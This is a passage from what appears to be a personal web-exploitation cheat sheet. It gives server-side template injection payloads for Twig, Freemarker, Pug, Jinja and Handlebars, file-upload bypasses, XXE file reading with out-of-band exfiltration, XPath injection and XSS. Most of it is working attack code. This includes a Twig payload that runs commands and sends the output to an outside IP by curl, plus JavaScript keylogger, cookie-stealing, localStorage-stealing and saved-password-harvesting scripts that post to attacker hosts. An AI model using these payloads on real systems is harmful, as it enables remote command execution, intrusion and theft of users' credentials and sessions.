Side</th></tr></thead><tbody><tr><td>Twig</td><td>PHP</td><td>Server Side</td></tr><tr><td>Freemarker</td><td>Java</td><td>Server Side</td></tr><tr><td>Pug/Jade</td><td>JavaScript</td><td>Mostly Server Side</td></tr><tr><td>Jinja</td><td>Python</td><td>Server Side</td></tr><tr><td>Handlebars</td><td>JavaScript</td><td>Both</td></tr><tr><td>Mustache</td><td>Multiple</td><td>Varies</td></tr></tbody></table><h4 id=twig>Twig<a hidden class=anchor aria-hidden=true href=#twig>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>h1</span><span class=o>&gt;&lt;?</span><span class=nx>php</span> <span class=k>echo</span> <span class=nv>$name</span> <span class=cp>?&gt;</span><span class=err>&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;p&gt;Welcome to our site!&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php 
</span></span></span><span class=line><span class=cl><span class=err>if ($isAdmin) {
</span></span></span><span class=line><span class=cl><span class=err>  echo &#34;&lt;p&gt;You are the supreme leader and we love you&lt;/p&gt;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span></code></pre></div><ul><li><code>{{7*7}}</code> <code>{{7*'7'}}</code> both are ok = 49</li><li>Usually look for filter with <code>=></code> they can be used with <code>system</code></li><li><code>{{['cat flag.txt']|map('system')}}</code></li><li><code>{{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}}</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nx>set</span> <span class=nx>output</span> <span class=o>%</span><span class=p>}</span> <span class=c1>// used to exfill whoami from a form usigng craft cms
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{{[</span><span class=mi>0</span><span class=p>]</span><span class=o>|</span><span class=nx>reduce</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>,</span><span class=s1>&#39;whoami&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nx>endset</span> <span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nx>set</span> <span class=nx>exfill</span><span class=o>=</span> <span class=nx>output</span><span class=o>|</span> <span class=nx>url_encode</span> <span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>{{[</span><span class=s1>&#39;curl http://192.168.49.191/a?exfill=&#39;</span> <span class=o>~</span> <span class=nx>exfill</span><span class=p>]</span><span class=o>|</span><span class=nx>map</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>)}}</span>
</span></span></code></pre></div><h4 id=freemarker>Freemarker<a hidden class=anchor aria-hidden=true href=#freemarker>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>&lt;</span><span class=n>h1</span><span class=o>&gt;</span><span class=n>Hello</span> <span class=n>$</span><span class=o>{</span><span class=n>name</span><span class=o>}!&lt;/</span><span class=n>h1</span><span class=o>&gt;</span> <span class=c1>// INTERPOLATION $
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;</span><span class=err>#</span><span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s>&#34;hacker&#34;</span><span class=o>&gt;</span> <span class=c1>//FTL TAG starts with #
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>The</span> <span class=n>top</span> <span class=n>reasons</span> <span class=n>you</span><span class=err>&#39;</span><span class=n>re</span> <span class=n>great</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=err>#</span><span class=n>list</span> <span class=n>reasons</span> <span class=n>as</span> <span class=n>reason</span><span class=o>&gt;</span> 
</span></span><span class=line><span class=cl>   <span class=n>$</span><span class=o>{</span><span class=n>reason</span><span class=o>?</span><span class=n>index</span> <span class=o>+</span> <span class=n>1</span><span class=o>}:</span> <span class=n>$</span><span class=o>{</span><span class=n>reason</span><span class=o>}</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;/</span><span class=err>#</span><span class=n>list</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=err>#</span><span class=k>if</span><span class=o>&gt;</span>
</span></span></code></pre></div><ul><li>more prone to xss as sometimes html is not escaped <code>&lt;i>a&lt;/i></code></li><li><code>${7*7}</code> ok <code>${7*'7'}</code> not</li><li><code>${"freemarker.template.utility.Execute"?new()("whoami")}</code></li></ul><h4 id=pug-jade-payload-generatorhttpsgithubcomvikasvarshneyssti-payload>Pug (jade) <a href=https://github.com/VikasVarshney/ssti-payload>PAYLOAD GENERATOR</a><a hidden class=anchor aria-hidden=true href=#pug-jade-payload-generatorhttpsgithubcomvikasvarshneyssti-payload>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>h1</span> <span class=nx>Hello</span><span class=p>,</span> <span class=err>#</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>input</span><span class=p>(</span><span class=nx>type</span><span class=o>=</span><span class=s1>&#39;hidden&#39;</span> <span class=nx>name</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span> <span class=nx>value</span><span class=o>=</span><span class=s1>&#39;true&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nx>showSecret</span>
</span></span><span class=line><span class=cl>  <span class=o>-</span> <span class=nx>secret</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;❤️&#39;</span><span class=p>,</span><span class=s1>&#39;😍&#39;</span><span class=p>,</span> <span class=s1>&#39;🤟&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=nx>p</span> <span class=nx>The</span> <span class=nx>secrets</span> <span class=nx>are</span><span class=o>:</span> 
</span></span><span class=line><span class=cl>  <span class=nx>each</span> <span class=nx>val</span> <span class=k>in</span> <span class=nx>secret</span>
</span></span><span class=line><span class=cl>    <span class=nx>p</span> <span class=err>#</span><span class=p>{</span><span class=nx>val</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=nx>p</span> <span class=nx>No</span> <span class=nx>secret</span> <span class=k>for</span> <span class=nx>you</span><span class=o>!</span>
</span></span></code></pre></div><ul><li>Commonly integrated with Express framework in a Nodejs app</li><li><code>#{name}</code></li><li><code>child_process.spawnSync</code> executes commands (is not accessible by default need to require)<ul><li>can be checked by <code>= require</code> if no access use <code>= global.process.mainModule.require</code></li></ul></li></ul><p>PAYLOAD</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>-</span> <span class=kd>var</span> <span class=nx>require</span> <span class=o>=</span> <span class=nx>global</span><span class=p>.</span><span class=nx>process</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span> 
</span></span><span class=line><span class=cl><span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>spawnSync</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>).</span><span class=nx>stdout</span> <span class=c1>// will result to [object Object] without .spawnSync
</span></span></span></code></pre></div><h4 id=jinja>Jinja<a hidden class=anchor aria-hidden=true href=#jinja>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&lt;</span><span class=n>h1</span><span class=o>&gt;</span><span class=n>Hey</span> <span class=p>{{</span> <span class=n>name</span> <span class=p>}}</span><span class=o>&lt;/</span><span class=n>h1</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=k>if</span> <span class=n>reasons</span> <span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Here</span> <span class=n>are</span> <span class=n>a</span> <span class=n>couple</span> <span class=n>of</span> <span class=n>reasons</span> <span class=n>why</span> <span class=n>you</span> <span class=n>are</span> <span class=n>great</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>ul</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=n>reasons</span> <span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=o>&lt;</span><span class=n>li</span><span class=o>&gt;</span><span class=p>{{</span><span class=n>r</span><span class=p>}}</span><span class=o>&lt;/</span><span class=n>li</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=n>endfor</span> <span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>ul</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=n>endif</span> <span class=o>%</span><span class=p>}</span>
</span></span></code></pre></div><ul><li><code>{{5*"5"}}</code> = <code>55555</code></li><li><code>{{config|pprint}}</code></li></ul><h4 id=handlebars--mustache>Handlebars / Mustache<a hidden class=anchor aria-hidden=true href=#handlebars--mustache>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>&lt;</span><span class=n>h1</span><span class=o>&gt;</span><span class=n>Hello</span> <span class=o>{{</span><span class=n>name</span><span class=o>}}&lt;/</span><span class=n>h1</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>{{</span><span class=err>#</span><span class=k>if</span> <span class=n>nicknames</span><span class=o>}}</span>
</span></span><span class=line><span class=cl><span class=n>Also</span> <span class=n>known</span> <span class=n>as</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=o>{{</span><span class=err>#</span><span class=n>each</span> <span class=n>nicknames</span><span class=o>}}</span>
</span></span><span class=line><span class=cl>      <span class=o>{{</span><span class=k>this</span><span class=o>}}</span>
</span></span><span class=line><span class=cl>  <span class=o>{{/</span><span class=n>each</span><span class=o>}}</span>
</span></span><span class=line><span class=cl><span class=o>{{/</span><span class=k>if</span><span class=o>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>We</span> <span class=n>are</span> <span class=n>using</span> <span class=n>handlebars</span> <span class=n>locally</span> <span class=n>in</span> <span class=n>your</span> <span class=n>browser</span> <span class=n>to</span> <span class=n>generate</span> <span class=k>this</span> <span class=n>template</span>
</span></span></code></pre></div><ul><li>Mustache is logic-less only supports <code>if</code> statements</li><li>Mustache is too restrictive thats why handlebars was created.</li><li>check if Handlebars uses helpers specially <code>read</code> and <code>readdir</code> <code>{{read "/etc/passwd"}}</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>{{</span><span class=err>#</span><span class=n>each</span> <span class=o>(</span><span class=n>readdir</span> <span class=s>&#34;/etc&#34;</span><span class=o>)}}</span>
</span></span><span class=line><span class=cl><span class=o>{{</span><span class=k>this</span><span class=o>}}</span>
</span></span><span class=line><span class=cl><span class=o>{{/</span><span class=n>each</span><span class=o>}}</span>
</span></span></code></pre></div><ul><li>Craft CMS SSTI<ul><li>vulnerable sprout forms plugin</li><li>blind ssti</li></ul></li></ul><h4 id=tplmap>TPLMap<a hidden class=anchor aria-hidden=true href=#tplmap>#</a></h4><ul><li>Python2 only</li><li>Snowscan usage of TPLmap on OZ HTB - <a href=https://snowscan.io/htb-writeup-oz/#>Snowscan</a></li></ul><h3 id=file-upload>File Upload<a hidden class=anchor aria-hidden=true href=#file-upload>#</a></h3><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files>PayloadAlltheThings</a></p><ul><li>Change <strong><em>Content-Type</em></strong></li><li>For Apache web servers try uploading <strong><em>.htaccess</em></strong> with the following contents<ul><li><code>AddType application/x-httpd-php .l33t</code> this will allow the extension <code>.l33t</code> and treat it as php. Learned from portswigger lab (although .phtml worked in their lab xD)</li></ul></li><li>add nullbyte and check if the web app strips the nullbyte and .jpg at the end.</li><li>magic bytes<ul><li>upload a normal image strip some of the contents leave the magic bytes at the beginning then append your payload.
or</li><li><code>exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" &lt;YOUR-INPUT-IMAGE>.jpg -o polyglot.php</code></li></ul></li><li>Race condition? for fileuploads that checks for viruses etc. might have a small window that we can execute a php payload. use turbo intruder. <a href=https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition>Portswigger Lab</a></li></ul><h3 id=xxe>XXE<a hidden class=anchor aria-hidden=true href=#xxe>#</a></h3><ul><li><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection>PayloadAlltheThings</a></p></li><li><p>Check white spaces - only one newline from header!</p></li><li><p><a href="https://www.informit.com/articles/article.aspx?p=27006&seqNum=3">Informit</a> XML structure</p></li><li><p>Delete % from payloads you get in PayloadAlltheThings.</p></li><li><p>if xml needs the <code>&lt;></code> as text xml needs to be enclosed in a <code>CDATA</code> section</p></li><li><p>Testing for XXE</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE data [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ELEMENT data ANY &gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY lastname &#34;Replaced&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;Contact&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;lastName&gt;</span><span class=ni>&amp;lastname;</span><span class=nt>&lt;/lastName&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;firstName&gt;</span>Tom<span class=nt>&lt;/firstName&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Contact&gt;</span>
</span></span></code></pre></div><ul><li>Retrieving files</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE data [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ELEMENT data ANY &gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY lastname SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;Contact&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;lastName&gt;</span><span class=ni>&amp;lastname;</span><span class=nt>&lt;/lastName&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;firstName&gt;</span>Tom<span class=nt>&lt;/firstName&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Contact&gt;</span>
</span></span></code></pre></div><ul><li>Out of band Testing ssrf</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE data [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ELEMENT data ANY &gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY lastname SYSTEM &#34;http://&lt;our ip address&gt;</span>/somefile&#34;&gt;
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;Contact&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;lastName&gt;</span><span class=ni>&amp;lastname;</span><span class=nt>&lt;/lastName&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;firstName&gt;</span>Tom<span class=nt>&lt;/firstName&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Contact&gt;</span>
</span></span></code></pre></div><ul><li>Out of band dtd contents</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;!ENTITY % content SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % external &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;http://your ip address/out?%content;&#39;&gt;</span>&#34; &gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;!ENTITY % content SYSTEM &#34;file:///etc/timezone&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % external &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;http://your ip address/out?%content;&#39;&gt;</span>&#34; &gt;
</span></span></code></pre></div><p>send this</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span> 
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE oob [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % base SYSTEM &#34;http://your ip address/external.dtd&#34;&gt;</span> 
</span></span><span class=line><span class=cl>%base;
</span></span><span class=line><span class=cl>%external;
</span></span><span class=line><span class=cl>%exfil;
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;entity-engine-xml&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/entity-engine-xml&gt;</span>
</span></span></code></pre></div><h4 id=xpath>XPATH<a hidden class=anchor aria-hidden=true href=#xpath>#</a></h4><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection>PayloadAlltheThings</a></li><li><code>' or 1=1}/parent::*/child::node()%00</code></li></ul><h3 id=xss>XSS<a hidden class=anchor aria-hidden=true href=#xss>#</a></h3><ul><li>js can access cookies if they <strong><em>DO NOT HAVE</em></strong> the <code>httpOnly</code> flag enabled.</li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection>PayloadAlltheThings</a></li><li>Test in all inputs and params</li><li><code>&lt;script>fetch('/settings?new_password=pass123');&lt;/script></code>?</li><li><code>&lt;script src="http://192.168.49.194:8000/xss.js">&lt;/script></code></li><li>all tags blocked? use custom tag</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>   <span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nx>location</span> <span class=o>=</span> <span class=s1>&#39;https://acd21f001f9a7723c0f207c1008700d5.web-security-academy.net/?search=&lt;xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1&gt;#x&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></div><ul><li>not sure but this worked, from burpsuite acad <code>%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E</code></li><li><code>&lt;script>document.write('&lt;iframe src=file:///etc/passwd>&lt;/iframe>');&lt;/script></code> read file xss?</li></ul><h4 id=keylogger>Keylogger<a hidden class=anchor aria-hidden=true href=#keylogger>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>logKey</span><span class=p>(</span><span class=nx>event</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://attacker:8000/k?key=&#34;</span><span class=o>+</span> <span class=nx>event</span><span class=p>.</span><span class=nx>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;keydown&#39;</span><span class=p>,</span> <span class=nx>logKey</span><span class=p>);</span>
</span></span></code></pre></div><p>Ref: <a href=https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event>https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event</a></p><h4 id=reflected-xss>Reflected XSS<a hidden class=anchor aria-hidden=true href=#reflected-xss>#</a></h4><p>Craft malicious link > send to victim</p><ul><li>Search functions <code>http://blah.com/search?=&lt;sCript>alert(1)&lt;/sCript></code></li></ul><h4 id=reflected-client-xss>Reflected Client XSS<a hidden class=anchor aria-hidden=true href=#reflected-client-xss>#</a></h4><ul><li><code>&lt;img src='x' onerror='alert(1)'></code></li><li><code>&lt;sCript></code> tag shouldn&rsquo;t run in inner.html so use the above</li></ul><h4 id=steal-cookie>Steal Cookie<a hidden class=anchor aria-hidden=true href=#steal-cookie>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>cookie</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>encodedCookie</span> <span class=o>=</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://attackerlistener:8000/exfil?data=&#34;</span> <span class=o>+</span> <span class=nx>encodedCookie</span><span class=p>)</span>
</span></span></code></pre></div><h4 id=local-secrets>Local Secrets<a hidden class=anchor aria-hidden=true href=#local-secrets>#</a></h4><ul><li>localStorage > accessed using <code>window.localStorage</code></li><li>sessionStorage > accessed using <code>window.sessionStorage</code> keeps data until tab is closed</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>data</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>localStorage</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>encodedData</span> <span class=o>=</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://attackerlistener:8000/exfil?data=&#34;</span> <span class=o>+</span> <span class=nx>encodedData</span><span class=p>)</span>
</span></span></code></pre></div><h4 id=stealing-saved-passwords>Stealing saved passwords<a hidden class=anchor aria-hidden=true href=#stealing-saved-passwords>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>body</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s2>&#34;body&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>   <span class=kd>var</span> <span class=nx>u</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=nx>u</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s2>&#34;text&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=nx>u</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>position</span> <span class=o>=</span> <span class=s2>&#34;fixed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=c1>//u.style.opacity = &#34;0&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span> 
</span></span><span class=line><span class=cl>   <span class=kd>var</span> <span class=nx>p</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=nx>p</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s2>&#34;password&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=nx>p</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>position</span> <span class=o>=</span> <span class=s2>&#34;fixed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=c1>//p.style.opacity = &#34;0&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span> 
</span></span><span class=line><span class=cl>   <span class=nx>body</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=nx>u</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=nx>body</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=nx>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>   <span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span> 
</span></span><span class=line><span class=cl>           <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://attacker.ip/k?u=&#34;</span> <span class=o>+</span> <span class=nx>u</span><span class=p>.</span><span class=nx>value</span> <span class=o>+</span> <span class=s2>&#34;&amp;p=&#34;</span> <span class=o>+</span> <span class=nx>p</span><span class=p>.</span><span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=mi>5000</span><span class=p>);</span>
</span></span></code></pre></div><h4 id=stealing-passwords-external>stealing passwords external<a hidden class=anchor aria-hidden=true href=#stealing-passwords-external>#</a></h4><ul><li><code>&lt;script src="http://myip/asd.js">&lt;/script></code> store in target</li><li>then host the following <code>asd.js</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>newDiv</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>newContent</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createTextNode</span><span class=p>(</span><span class=s1>&#39;document.location=&#34;http://192.168.49.191/?c=&#34;+document.cookie&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>newDiv</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>newContent</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>currentDiv</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;div1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>insertBefore</span><span class=p>(</span><span class=nx>newDiv</span><span class=p>,</span> <span class=nx>currentDiv</span><span class=p>);</span>
</span></span></code></pre></div><p>or</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=nx>addElement</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>addElement</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// create a new script element
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>newDiv</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>newContent</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createTextNode</span><span class=p>(</span><span class=s1>&#39;window.location=&#34;http://192.168.49.191/?c=&#34; + document.cookie&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>newDiv</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>newContent</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>currentDiv</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;div1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>insertBefore</span><span class=p>(</span><span class=nx>newDiv</span><span class=p>,</span> <span class=nx>currentDiv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
